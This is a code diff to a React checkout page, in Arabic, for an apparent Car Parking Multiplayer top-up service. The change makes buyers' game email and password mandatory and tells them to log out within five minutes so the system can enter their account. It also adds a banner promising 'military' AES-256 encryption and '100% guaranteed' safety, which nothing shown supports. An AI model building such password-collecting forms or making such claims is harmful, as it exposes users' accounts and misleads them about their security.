@@ -97,8 +97,13 @@ export default function CheckoutPage() {
       return;
     }
 
-    if (requiresGameCredentials && !gameUsername.trim()) {
-      toast.error("يرجى إدخال اسم الحساب أو البريد الخاص بلعبة كار باركينج.");
+    if (!gameUsername.trim() || !gameUsername.includes("@")) {
+      toast.error("يرجى إدخال البريد الإلكتروني المسجل في لعبة Car Parking.");
+      return;
+    }
+
+    if (!gamePassword || gamePassword.trim().length < 3) {
+      toast.error("يرجى إدخال كلمة مرور حساب اللعبة.");
       return;
     }
 
@@ -193,53 +198,56 @@ export default function CheckoutPage() {
               </div>
             )}
 
-            {/* Game Account Credentials Form (If required) */}
-            <div className="p-6 rounded-3xl bg-garage-900/90 border border-gray-800 space-y-4">
+            {/* Game Account Credentials Form */}
+            <div className="p-6 rounded-3xl bg-[#12161f] border border-orange-500/30 space-y-4">
               <div className="flex items-center gap-2 text-white font-bold text-sm">
-                <Gamepad2 className="w-5 h-5 text-neon-cyan" />
+                <Gamepad2 className="w-5 h-5 text-orange-500" />
                 <span>بيانات حساب لعبة Car Parking Multiplayer</span>
               </div>
 
-              {requiresGameCredentials ? (
-                <p className="text-xs text-gray-400 leading-relaxed">
-                  المنتجات المحددة تتطلب الوصول لحسابك لإجراء التعديل أو شحن الأموال.
+              <p className="text-xs text-gray-400 leading-relaxed">
+                يرجى إدخال البريد الإلكتروني وكلمة المرور المسجلين في لعبة Car Parking لتنفيذ الشحن أو إضافة السيارات في حسابك.
+              </p>
+
+              {/* 5-Minute Logout Warning Box */}
+              <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1.5 text-xs text-amber-300">
+                <div className="flex items-center gap-2 font-black text-amber-400">
+                  <AlertTriangle className="w-4 h-4 shrink-0 text-amber-400" />
+                  <span>تنبيه هام جداً لتجنب فشل الطلب:</span>
+                </div>
+                <p className="leading-relaxed text-[11px] text-gray-300">
+                  بعد تأكيد الطلب مباشرة، <strong>يجب تسجيل الخروج من حسابك داخل اللعبة خلال 5 دقائق</strong>، حتى يتمكن السيستم من الدخول لحسابك وإتمام الشحن بنجاح دون حدوث تعارض في الجلسة.
                 </p>
-              ) : (
-                <p className="text-xs text-gray-400 leading-relaxed">
-                  (اختياري) يمكنك كتابة ID اللاعب داخل اللعبة لتسهيل التواصل والتسليم.
-                </p>
-              )}
+              </div>
 
               <div className="space-y-3 pt-2">
                 <div>
                   <label className="block text-xs font-medium text-gray-300 mb-1">
-                    بريد أو اسم حساب اللعبة (Game Email / ID) *
+                    البريد الإلكتروني المسجل في اللعبة (Game Email) *
                   </label>
                   <input
-                    type="text"
-                    required={requiresGameCredentials}
-                    placeholder="مثال: your_cpm_email@gmail.com أو Player ID"
+                    type="email"
+                    required
+                    placeholder="example@gmail.com"
                     value={gameUsername}
                     onChange={(e) => setGameUsername(e.target.value)}
-                    className="w-full px-3.5 py-2.5 bg-garage-850 border border-gray-700 rounded-xl text-xs text-white placeholder-gray-500 focus:border-neon-cyan text-right dir-ltr"
+                    className="w-full px-3.5 py-2.5 bg-[#1a202c] border border-gray-700 rounded-xl text-xs text-white placeholder-gray-500 focus:border-orange-500 text-right dir-ltr font-mono"
                   />
                 </div>
 
-                {requiresGameCredentials && (
-                  <div>
-                    <label className="block text-xs font-medium text-gray-300 mb-1">
-                      كلمة مرور حساب اللعبة (Game Password) *
-                    </label>
-                    <input
-                      type="password"
-                      required={requiresGameCredentials}
-                      placeholder="••••••••"
-                      value={gamePassword}
-                      onChange={(e) => setGamePassword(e.target.value)}
-                      className="w-full px-3.5 py-2.5 bg-garage-850 border border-gray-700 rounded-xl text-xs text-white placeholder-gray-500 focus:border-neon-cyan text-right dir-ltr"
-                    />
-                  </div>
-                )}
+                <div>
+                  <label className="block text-xs font-medium text-gray-300 mb-1">
+                    كلمة مرور حساب اللعبة (Game Password) *
+                  </label>
+                  <input
+                    type="password"
+                    required
+                    placeholder="••••••••"
+                    value={gamePassword}
+                    onChange={(e) => setGamePassword(e.target.value)}
+                    className="w-full px-3.5 py-2.5 bg-[#1a202c] border border-gray-700 rounded-xl text-xs text-white placeholder-gray-500 focus:border-orange-500 text-right dir-ltr font-mono"
+                  />
+                </div>
 
                 <div>
                   <label className="block text-xs font-medium text-gray-300 mb-1">
@@ -247,19 +255,19 @@ export default function CheckoutPage() {
                   </label>
                   <textarea
                     rows={2}
-                    placeholder="اكتب أي تعليمات إضافية مثل نوع ولون الدخان المفضل..."
+                    placeholder="اكتب أي تعليمات إضافية مثل لون الدخان المفضل أو الجنوط..."
                     value={customerNotes}
                     onChange={(e) => setCustomerNotes(e.target.value)}
-                    className="w-full p-3 bg-garage-850 border border-gray-700 rounded-xl text-xs text-white placeholder-gray-500 focus:border-neon-cyan text-right"
+                    className="w-full p-3 bg-[#1a202c] border border-gray-700 rounded-xl text-xs text-white placeholder-gray-500 focus:border-orange-500 text-right"
                   />
                 </div>
               </div>
 
-              {/* Security Pledge Banner */}
-              <div className="p-3.5 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-start gap-2.5 text-xs text-cyan-200 mt-4">
-                <Lock className="w-4 h-4 text-neon-cyan shrink-0 mt-0.5" />
-                <p className="leading-relaxed">
-                  <strong>تعهد الخصوصية والأمان:</strong> بيانات حسابك مشفرة بالكامل بنظام AES-256 وتستخدم فقط من قِبل المتخصص لتنفيذ طلبك ولا يتم مشاركتها أو حفظها في أي سجلات عامة.
+              {/* Security & Confidentiality Pledge Banner */}
+              <div className="p-3.5 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-start gap-2.5 text-xs text-green-200 mt-4">
+                <ShieldCheck className="w-4 h-4 text-green-400 shrink-0 mt-0.5" />
+                <p className="leading-relaxed text-[11px]">
+                  <strong>تأكيد الأمان والسرية التامة:</strong> بيانات حسابك مشفرة بالكامل بتشفير AES-256 العسكري، وتستخدم آلياً لتنفيذ طلبك فقط ولا يتم مشاركتها أو الاطلاع عليها من أي طرف خارجي. أمانك مضمون 100%.
                 </p>
               </div>
             </div>
